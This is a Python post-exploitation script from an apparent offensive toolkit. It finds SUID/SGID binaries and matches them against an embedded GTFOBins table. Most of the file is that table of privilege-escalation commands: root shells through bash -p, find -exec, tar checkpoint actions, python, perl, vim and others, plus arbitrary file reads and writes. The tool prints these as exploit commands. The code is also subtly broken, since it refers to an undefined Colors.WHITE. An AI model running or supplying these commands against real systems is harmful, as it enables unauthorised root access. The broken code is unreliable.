#!/usr/bin/env python3
"""
SUID Binary Finder and GTFOBins Matcher

Finds SUID/SGID binaries and matches them against GTFOBins database
for privilege escalation opportunities. Provides exact exploit commands.

Usage:
    python3 -m redshift_toolkit.postex.suid_finder
    python3 -m redshift_toolkit.postex.suid_finder --format json
    python3 -m redshift_toolkit.postex.suid_finder --sgid

Author: Redshift Project — Module 20
License: MIT
"""

from __future__ import annotations

import os
import subprocess
import json
import argparse
import sys
from pathlib import Path
from dataclasses import dataclass
from typing import List, Dict, Optional


# ANSI Color Constants
class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    GREY = "\033[90m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def paint(text: str, color: str, use_color: bool = True) -> str:
    """Apply color if use_color is True."""
    if not use_color:
        return text
    return f"{color}{text}{Colors.RESET}"


@dataclass
class SUIDResult:
    """SUID/SGID binary discovery result."""
    path: str
    owner: str
    group: str
    permissions: str
    size: int
    suid: bool
    sgid: bool
    gtfobins_match: bool
    exploit_methods: List[str]
    exploit_commands: List[str]


# Embedded GTFOBins database (key entries for SUID exploitation)
GTFOBINS_SUID = {
    'awk': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './awk \'//\' "$LFILE"'
        ]
    },
    'base64': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            'base64 "$LFILE" | base64 --decode'
        ]
    },
    'bash': {
        'methods': ['SUID'],
        'commands': [
            './bash -p'
        ]
    },
    'cat': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './cat "$LFILE"'
        ]
    },
    'chmod': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_change',
            './chmod 6777 "$LFILE"'
        ]
    },
    'cp': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_write',
            'echo "data" | ./cp /dev/stdin "$LFILE"'
        ]
    },
    'curl': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './curl file://"$LFILE"'
        ]
    },
    'cut': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './cut -d "" -f1 "$LFILE"'
        ]
    },
    'dash': {
        'methods': ['SUID'],
        'commands': [
            './dash -p'
        ]
    },
    'date': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './date -f "$LFILE"'
        ]
    },
    'dd': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_write',
            'echo "data" | ./dd of="$LFILE"'
        ]
    },
    'diff': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './diff --line-format=%L /dev/null "$LFILE"'
        ]
    },
    'ed': {
        'methods': ['SUID'],
        'commands': [
            './ed',
            '!/bin/sh'
        ]
    },
    'env': {
        'methods': ['SUID'],
        'commands': [
            './env /bin/sh -p'
        ]
    },
    'expand': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './expand "$LFILE"'
        ]
    },
    'file': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './file -f "$LFILE"'
        ]
    },
    'find': {
        'methods': ['SUID'],
        'commands': [
            './find . -exec /bin/sh -p \\; -quit'
        ]
    },
    'grep': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './grep \'\' "$LFILE"'
        ]
    },
    'head': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './head -c1G "$LFILE"'
        ]
    },
    'less': {
        'methods': ['SUID'],
        'commands': [
            './less /etc/profile',
            '!/bin/sh'
        ]
    },
    'ln': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_write',
            'TF=$(mktemp)',
            'echo "DATA" > "$TF"',
            './ln -sf "$TF" "$LFILE"'
        ]
    },
    'more': {
        'methods': ['SUID'],
        'commands': [
            './more /etc/profile',
            '!/bin/sh'
        ]
    },
    'mv': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_write',
            'TF=$(mktemp)',
            'echo "DATA" > "$TF"',
            './mv "$TF" "$LFILE"'
        ]
    },
    'nano': {
        'methods': ['SUID'],
        'commands': [
            './nano',
            '^R^X',
            'reset; sh 1>&0 2>&0'
        ]
    },
    'nice': {
        'methods': ['SUID'],
        'commands': [
            './nice /bin/sh -p'
        ]
    },
    'nl': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './nl -bn -w1 -s \'\' "$LFILE"'
        ]
    },
    'nohup': {
        'methods': ['SUID'],
        'commands': [
            './nohup /bin/sh -p -c "sh -p <&2 >&2"'
        ]
    },
    'od': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './od -An -c -w9999 "$LFILE"'
        ]
    },
    'openssl': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './openssl enc -in "$LFILE"'
        ]
    },
    'perl': {
        'methods': ['SUID'],
        'commands': [
            './perl -e \'exec "/bin/sh";\''
        ]
    },
    'php': {
        'methods': ['SUID'],
        'commands': [
            'CMD="/bin/sh"',
            './php -r "pcntl_exec(\'/bin/sh\', [\'-p\']);"'
        ]
    },
    'python': {
        'methods': ['SUID'],
        'commands': [
            './python -c \'import os; os.execl("/bin/sh", "sh", "-p")\''
        ]
    },
    'python2': {
        'methods': ['SUID'],
        'commands': [
            './python2 -c \'import os; os.execl("/bin/sh", "sh", "-p")\''
        ]
    },
    'python3': {
        'methods': ['SUID'],
        'commands': [
            './python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\''
        ]
    },
    'rev': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './rev "$LFILE"'
        ]
    },
    'ruby': {
        'methods': ['SUID'],
        'commands': [
            './ruby -e \'exec "/bin/sh"\''
        ]
    },
    'sed': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './sed \'\' "$LFILE"'
        ]
    },
    'sh': {
        'methods': ['SUID'],
        'commands': [
            './sh -p'
        ]
    },
    'sort': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './sort -m "$LFILE"'
        ]
    },
    'tail': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './tail -c1G "$LFILE"'
        ]
    },
    'tar': {
        'methods': ['SUID'],
        'commands': [
            './tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'
        ]
    },
    'timeout': {
        'methods': ['SUID'],
        'commands': [
            './timeout 7d /bin/sh -p'
        ]
    },
    'ul': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './ul "$LFILE"'
        ]
    },
    'unexpand': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './unexpand -t99999999 "$LFILE"'
        ]
    },
    'uniq': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './uniq "$LFILE"'
        ]
    },
    'vi': {
        'methods': ['SUID'],
        'commands': [
            './vi -c \':!/bin/sh\' /dev/null'
        ]
    },
    'vim': {
        'methods': ['SUID'],
        'commands': [
            './vim -c \':!/bin/sh\''
        ]
    },
    'wc': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './wc --files0-from="$LFILE"'
        ]
    },
    'wget': {
        'methods': ['SUID'],
        'commands': [
            'LFILE=file_to_read',
            './wget -i "$LFILE"'
        ]
    },
    'xargs': {
        'methods': ['SUID'],
        'commands': [
            './xargs -a /dev/null sh -p'
        ]
    },
    'zsh': {
        'methods': ['SUID'],
        'commands': [
            './zsh'
        ]
    }
}


def run_command(cmd: List[str]) -> str:
    """Execute command and return output."""
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout.strip() if result.returncode == 0 else ""
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return ""


def find_suid_binaries(include_sgid: bool = False) -> List[SUIDResult]:
    """Find SUID/SGID binaries on the system."""
    results = []
    
    # Common search paths
    search_paths = [
        "/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin",
        "/bin", "/sbin", "/opt", "/usr/libexec"
    ]
    
    perm_flags = "-perm -4000"
    if include_sgid:
        perm_flags = "\\( -perm -4000 -o -perm -2000 \\)"
    
    print(paint("🔍 Searching for SUID/SGID binaries...", Colors.CYAN, True))
    
    for search_path in search_paths:
        if not os.path.exists(search_path):
            continue
            
        cmd = ["find", search_path, "-type", "f", perm_flags, "2>/dev/null"]
        find_output = run_command(["bash", "-c", " ".join(cmd)])
        
        if not find_output:
            continue
            
        for binary_path in find_output.split('\n'):
            if not binary_path.strip():
                continue
                
            try:
                stat_info = os.stat(binary_path)
                file_mode = stat_info.st_mode
                
                # Check SUID/SGID bits
                is_suid = bool(file_mode & 0o4000)
                is_sgid = bool(file_mode & 0o2000)
                
                if not is_suid and not include_sgid:
                    continue
                if not is_suid and not is_sgid:
                    continue
                
                # Get file details
                try:
                    import pwd
                    import grp
                    owner = pwd.getpwuid(stat_info.st_uid).pw_name
                    group = grp.getgrgid(stat_info.st_gid).gr_name
                except (KeyError, ImportError):
                    owner = str(stat_info.st_uid)
                    group = str(stat_info.st_gid)
                
                permissions = oct(file_mode)[-4:]
                size = stat_info.st_size
                
                # Check against GTFOBins
                binary_name = os.path.basename(binary_path)
                gtfo_entry = GTFOBINS_SUID.get(binary_name)
                
                exploit_methods = []
                exploit_commands = []
                gtfobins_match = False
                
                if gtfo_entry:
                    gtfobins_match = True
                    exploit_methods = gtfo_entry['methods']
                    exploit_commands = gtfo_entry['commands']
                
                result = SUIDResult(
                    path=binary_path,
                    owner=owner,
                    group=group,
                    permissions=permissions,
                    size=size,
                    suid=is_suid,
                    sgid=is_sgid,
                    gtfobins_match=gtfobins_match,
                    exploit_methods=exploit_methods,
                    exploit_commands=exploit_commands
                )
                
                results.append(result)
                
            except (OSError, PermissionError):
                continue
    
    return results


def print_results(results: List[SUIDResult], use_color: bool = True) -> None:
    """Print SUID finder results."""
    if not results:
        print(paint("ℹ️  No SUID/SGID binaries found", Colors.GREY, use_color))
        return
    
    # Separate exploitable from non-exploitable
    exploitable = [r for r in results if r.gtfobins_match]
    non_exploitable = [r for r in results if not r.gtfobins_match]
    
    print(paint(f"\n🎯 SUID/SGID Binary Analysis Complete", Colors.GREEN, use_color))
    print(paint(f"📊 Total binaries found: {len(results)}", Colors.YELLOW, use_color))
    print(paint(f"🔥 GTFOBins matches: {len(exploitable)}", Colors.RED, use_color))
    print(paint(f"ℹ️  Other binaries: {len(non_exploitable)}", Colors.GREY, use_color))
    
    if exploitable:
        print(paint(f"\n🔥 EXPLOITABLE BINARIES (GTFOBins matches):", Colors.RED, use_color))
        print(paint("="*60, Colors.RED, use_color))
        
        for result in sorted(exploitable, key=lambda x: x.path):
            flags = []
            if result.suid:
                flags.append("SUID")
            if result.sgid:
                flags.append("SGID")
            flag_str = ",".join(flags)
            
            print(paint(f"\n📍 {result.path}", Colors.BOLD, use_color))
            print(paint(f"   Owner: {result.owner}:{result.group} | Perms: {result.permissions} | {flag_str}", Colors.CYAN, use_color))
            print(paint(f"   💥 Exploit Commands:", Colors.YELLOW, use_color))
            
            for cmd in result.exploit_commands:
                print(paint(f"      {cmd}", Colors.WHITE, use_color))
    
    if non_exploitable:
        print(paint(f"\n📋 OTHER SUID/SGID BINARIES:", Colors.GREY, use_color))
        print(paint("="*60, Colors.GREY, use_color))
        
        for result in sorted(non_exploitable, key=lambda x: x.path):
            flags = []
            if result.suid:
                flags.append("SUID")
            if result.sgid:
                flags.append("SGID")
            flag_str = ",".join(flags)
            
            print(paint(f"   {result.path} ({result.owner}:{result.group}, {flag_str})", Colors.GREY, use_color))


def format_json_output(results: List[SUIDResult]) -> str:
    """Format results as JSON."""
    output = {
        "total_binaries": len(results),
        "exploitable_count": len([r for r in results if r.gtfobins_match]),
        "binaries": []
    }
    
    for result in results:
        binary_data = {
            "path": result.path,
            "owner": result.owner,
            "group": result.group,
            "permissions": result.permissions,
            "size": result.size,
            "suid": result.suid,
            "sgid": result.sgid,
            "gtfobins_match": result.gtfobins_match,
            "exploit_methods": result.exploit_methods,
            "exploit_commands": result.exploit_commands
        }
        output["binaries"].append(binary_data)
    
    return json.dumps(output, indent=2)


def main():
    """Main function."""
    parser = argparse.ArgumentParser(
        description="SUID Binary Finder and GTFOBins Matcher",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Find SUID binaries with GTFOBins matching
    python3 -m redshift_toolkit.postex.suid_finder
    
    # Include SGID binaries
    python3 -m redshift_toolkit.postex.suid_finder --sgid
    
    # JSON output
    python3 -m redshift_toolkit.postex.suid_finder --format json
    
    # No color output
    python3 -m redshift_toolkit.postex.suid_finder --no-color

Note:
    - Exploit commands assume you're in the binary's directory
    - LFILE variable should be set to target file path
    - Test commands in controlled environment first
"""
    )
    
    parser.add_argument(
        "--sgid",
        action="store_true",
        help="Also search for SGID binaries"
    )
    parser.add_argument(
        "--format",
        choices=["text", "json"],
        default="text",
        help="Output format (default: text)"
    )
    parser.add_argument(
        "--no-color",
        action="store_true",
        help="Disable colored output"
    )
    
    args = parser.parse_args()
    use_color = not args.no_color
    
    try:
        # Find SUID/SGID binaries
        results = find_suid_binaries(include_sgid=args.sgid)
        
        if args.format == "json":
            print(format_json_output(results))
        else:
            print_results(results, use_color)
        
    except KeyboardInterrupt:
        print(paint("\n❌ Search interrupted", Colors.RED, use_color))
        sys.exit(1)
    except Exception as e:
        print(paint(f"❌ Error during search: {e}", Colors.RED, use_color))
        sys.exit(1)


if __name__ == "__main__":
    main()
